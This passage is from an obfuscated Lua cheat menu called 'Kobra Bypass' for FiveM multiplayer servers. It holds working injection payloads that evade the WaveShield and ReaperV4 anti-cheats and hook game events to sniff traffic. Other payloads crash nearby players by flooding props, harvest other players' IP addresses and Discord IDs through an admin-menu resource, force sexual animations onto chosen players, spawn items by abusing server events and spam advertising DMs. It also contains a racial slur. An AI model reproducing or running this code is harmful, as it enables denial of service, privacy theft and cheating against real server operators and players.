                                ]]);break;end end end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]]);end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v461={};for v570,v571 in pairs(v27) do if v571 then v461[ #v461 + (171 -(144 + 26)) ]=v570;end end if ( #v461==(0 -0)) then v271:Notify("error","Kobra","You must select a player first!",6996 -3996 );return;end for v572,v573 in ipairs(v461) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v573,v573));end v271:Notify("success","Kobra","Attempted to twerk on "   ..  #v461   .. " player(s)." ,1430 + 2570 );end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v462=0;local v463;while true do if (v462==(4 -3)) then if ( #v463==(0 + 0)) then v271:Notify("error","Kobra","You must select a player first!",3000);return;end for v797,v798 in ipairs(v463) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v798,v798));end v462=2;end if (v462==(0 -0)) then v463={};for v799,v800 in pairs(v27) do if v800 then v463[ #v463 + 1 + 0 ]=v799;end end v462=1;end if (2==v462) then v271:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v463   .. " player(s)." ,1498 + 2502 );break;end end end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v464=GetResourceState("WaveShield")=="started" ;local v465=GetResourceState("ReaperV4")=="started" ;if v464 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v465 then MachoInjectThread(0 -0 ,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end end},{type="button",label="Mission Row PD",onSelect=function() local v466=GetResourceState("WaveShield")=="started" ;local v467=GetResourceState("ReaperV4")=="started" ;if v466 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v467 then MachoInjectThread(376 -(365 + 11) ,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end end},{type="button",label="Pillbox Hospital",onSelect=function() local v468=GetResourceState("WaveShield")=="started" ;local v469=GetResourceState("ReaperV4")=="started" ;if v468 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v469 then MachoInjectThread(0 + 0 ,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end end},{type="button",label="Grove Street",onSelect=function() local v470=GetResourceState("WaveShield")=="started" ;local v471=GetResourceState("ReaperV4")=="started" ;if v470 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v471 then MachoInjectThread(0 -0 ,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end end},{type="button",label="Legion Square",onSelect=function() local v472=GetResourceState("WaveShield")=="started" ;local v473=GetResourceState("ReaperV4")=="started" ;if v472 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v473 then MachoInjectThread(0 -0 ,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v60("Choose Menu Key","",function(v574) for v623,v624 in pairs(v44) do if (v624:lower()==v574:lower()) then v23=v624;Wait(114 + 136 );v12:ShowUI();return;end end end,"keybind");end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1389 -(1307 + 81) ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=3 -2 ,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=1 + 0 ;v15=3 -2 ;end;local function v97(v272) for v474,v475 in ipairs(v16) do if (v475.label=="Server") then for v732,v733 in ipairs(v475.categories) do if (v733.label=="Triggers") then v733.tabs[ #v733.tabs + (261 -(197 + 63)) ]=v272;return;end end end end end v12.UpdateTabChecked=function(v273,v274,v275,v276) for v476,v477 in pairs(v274 or {} ) do if ((v477.label==v275) and ((v477.type=="checkbox") or (v477.type=="slider-checkbox") or v477.type:find("checkbox"))) then v477.checked=v276;elseif (v477.type=="subMenu") then if v477.categories then for v1028,v1029 in pairs(v477.categories) do v273:UpdateTabChecked(v1029.tabs,v275,v276);end end if v477.subTabs then v273:UpdateTabChecked(v477.subTabs,v275,v276);end end end end;v12.ShowKeybindList=function(v277,v278) v277:SendMessage({action="displayBinds",visible=true,binds=v278});end;v12.HideKeybindList=function(v279) v279:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v280,v281,v282,v283) local v284={};local v285=PlayerPedId();v282=v282 or 350 ;if ( not v285 or  not DoesEntityExist(v285) or  not IsPlayerPlaying(PlayerId())) then v284={};return v284;end local v286=GetActivePlayers();if v286 then for v626,v627 in ipairs(v286) do if (v283 or (v627~=PlayerId())) then local v801=GetPlayerPed(v627);if (v801 and DoesEntityExist(v801) and IsEntityAPed(v801) and  not IsEntityDead(v801)) then local v946=0;local v947;while true do if (v946==0) then v947=GetEntityCoords(v801);if v947 then local v1246=0 + 0 ;local v1247;while true do if (v1246==(0 + 0)) then v1247= #(v281-v947);if (v1247<=v282) then v284[ #v284 + 1 + 0 ]={name=GetPlayerName(v627),serverId=GetPlayerServerId(v627)};end break;end end end break;end end end end end else local v575=0 + 0 ;local v576;local v577;local v578;while true do if (v575==1) then repeat if (v577 and IsPedAPlayer(v577) and DoesEntityExist(v577)) then local v1030=NetworkGetPlayerIndexFromPed(v577);if ((v1030~= -1) and (v283 or (v1030~=PlayerId()))) then local v1186=0 -0 ;local v1187;while true do if (v1186==(1369 -(618 + 751))) then v1187=GetEntityCoords(v577);if v1187 then local v1342= #(v281-v1187);if (v1342<=v282) then v284[ #v284 + 1 + 0 ]={name=GetPlayerName(v1030),serverId=GetPlayerServerId(v1030)};end end break;end end end end v578,v577=FindNextPed(v576);until  not v578 EndFindPed(v576);break;end if ((1910 -(206 + 1704))==v575) then v576,v577=FindFirstPed();v578=nil;v575=1 -0 ;end end end if ( #v284==(0 -0)) then v284={};end return v284;end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(437 + 563 );v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",4275 -(155 + 1120) );Wait(2506 -(396 + 1110) );v12:Notify("info","Kobra","Hello Kobra Menu user, thanks for using Kobra Bypass!",6776 -3776 );Wait(326 + 674 );v97({type="button",label="Bypass WaveShield [Risky]",onSelect=function() if (GetResourceState("WaveShield")~="started") then local v628=0 + 0 ;while true do if ((0 + 0)==v628) then v12:Notify("info","Kobra","WaveShield not detected.",3000);return;end end end for v579=977 -(230 + 746) ,2 do MachoInjectResource2(604 -(473 + 128) ,"WaveShield",[[
                error('my nigga what happened :(')
            ]]);end v12:Notify("success","Kobra","WaveShield bypass attempted.",3048 -(39 + 9) );end});if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v97({type="button",label="DeFXAP Events",onSelect=function() local v629=0;local v630;local v631;local v632;while true do if (v629==(266 -(38 + 228))) then v12:HideUI();v630=nil;v631=false;v60("Resource Name","",function(v948) local v949=0;while true do if (v949==0) then if (v948 and (v948~="")) then v630=v948;end v631=true;break;end end end,"typeable");v629=1;end if (v629==(1 -0)) then while  not v631 do Wait(573 -(106 + 367) );end if ( not v630 or (v630=="")) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();return;end if (GetResourceState(v630)~="started") then local v1031=0 + 0 ;while true do if (v1031==0) then MachoMenuNotification("Error","Resource ^3"   .. v630   .. "^7 is not started or doesn’t exist." );v12:ShowUI();v1031=1;end if (v1031==1) then return;end end end v632=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v629=1864 -(354 + 1508) ;end if (v629==(6 -4)) then v48(v630,v632);MachoMenuNotification("Injector","Hooks injected into ^3"   .. v630   .. "^7 successfully!" );v12:ShowUI();break;end end end});end if (GetResourceState("ox_lib")=="started") then v97({type="button",label="CRASH NEARBY PLAYERS",onSelect=function() if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",3000);return;end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="BRING NEARBY PLAYERS",onSelect=function() local v633=0 + 0 ;while true do if (v633==0) then v12:Notify("success","Kobra","Attempting to bring all players",1759 + 1241 );MachoInjectThread(0,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);break;end end end});end if (GetResourceState("mc9-adminmenu")=="started") then v97({type="button",label="ADMIN MENU (F8)",onSelect=function() v12:Notify("success","Kobra","Admin Menu List",4034 -1034 );MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);end});end if (GetResourceState("mc9-mainmenu")=="started") then v97({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() local v634=1244 -(334 + 910) ;while true do if (v634==0) then v12:Notify("success","Kobra","Spawning Items",3895 -(92 + 803) );MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);break;end end end});end if (GetResourceState("vMenu")=="started") then v97({type="button",label="HIT DMS",onSelect=function() v12:Notify("success","Kobra","Message Sent",1653 + 1347 );MachoInjectResource2(1,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is Kobra Menu by JayThaaGamer, the leading cheat in the market.')
                ]]);end});end if (GetResourceState("amigo")=="started") then v97({type="button",label="ADD ITEM (1)",onSelect=function() local v635=0;local v636;local v637;local v638;local v639;local v640;local v641;while true do if (v635==(1185 -(1035 + 146))) then if (v639>100000) then local v1032=616 -(230 + 386) ;while true do if ((0 + 0)==v1032) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v639=101510 -(353 + 1157) ;break;end end end v637=tostring(v637 or "" );v639=tonumber(v639 or (1115 -(53 + 1061)) );v635=1640 -(1568 + 67) ;end if ((1 + 0)==v635) then print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v637=v636("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v637));v635=2;end if ((1 + 1)==v635) then if ( not v637 or (v637=="")) then local v1033=0 -0 ;while true do if (v1033==(0 -0)) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",7563 -4563 );v1033=1 + 0 ;end if (v1033==(1213 -(615 + 597))) then v12:ShowUI();return;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v638=v636("Item Count","1");v635=3 + 0 ;end if (v635==0) then v12:HideUI();v636=nil;function v636(v950,v951) local v952=0 -0 ;local v953;local v954;while true do if (v952==(2 + 0)) then return v953;end if (v952==(1 + 0)) then v60(v950,v951 or "" ,function(v1201) local v1202=0;while true do if (v1202==(0 + 0)) then v953=v1201;v954=true;break;end end end,"typeable");while  not v954 do Wait(1899 -(1056 + 843) );end v952=3 -1 ;end if ((0 -0)==v952) then v953=nil;v954=false;v952=1;end end end v635=2 -1 ;end if (v635==(2 + 1)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v638));v639=tonumber(v638);if ( not v639 or (v639<(1977 -(286 + 1690)))) then local v1034=0;while true do if (v1034==(911 -(98 + 813))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v639=1;break;end end end v635=2 + 2 ;end if (v635==6) then if  not v640 then local v1035=0;while true do if (v1035==(2 -1)) then v12:Notify("error","Kobra","String format failed — check console",4000);break;end if (v1035==(0 + 0)) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v641);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v637),"itemCount =",tostring(v639));v1035=508 -(263 + 244) ;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();break;end if (v635==(4 + 1)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v637);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v639);v640,v641=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v637,v639,v637,v639));end);v635=1693 -(1502 + 185) ;end end end});end local v287=GetResourceState("scripts")=="started" ;local v288=GetResourceState("framework")=="started" ;if (v287 or v288) then local v580=(v287 and "scripts") or "framework" ;v97({type="button",label="COMPLETE COMMS",onSelect=function() v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",572 + 2428 );MachoInjectResourceRaw(v580,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

